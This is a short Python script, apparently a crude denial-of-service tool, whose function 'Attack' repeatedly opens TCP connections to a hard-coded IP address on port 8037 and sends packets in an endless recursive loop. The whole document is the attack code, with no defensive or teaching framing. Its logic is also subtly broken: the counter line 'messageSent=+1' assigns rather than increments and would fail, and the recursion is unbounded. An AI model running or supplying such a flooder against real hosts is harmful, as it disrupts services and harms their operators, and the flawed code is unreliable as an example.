from socket import *

messageSent = 0 #keep track of number of packets sent to server

def Attack():
    while True:
        #connect to the server
        mySocket = socket(AF_INET, SOCK_STREAM)
        myPort = 8037
        mySocket.connect(("131.229.234.254", myPort))
        #send packet
        mySocket.send(b"Hello")
        messageSent=+1 #update counter
        print("packets sent: "+ str(messageSent))
        #recursively call function to keep sending packets
        Attack()



if __name__ == "__main__":
    Attack()


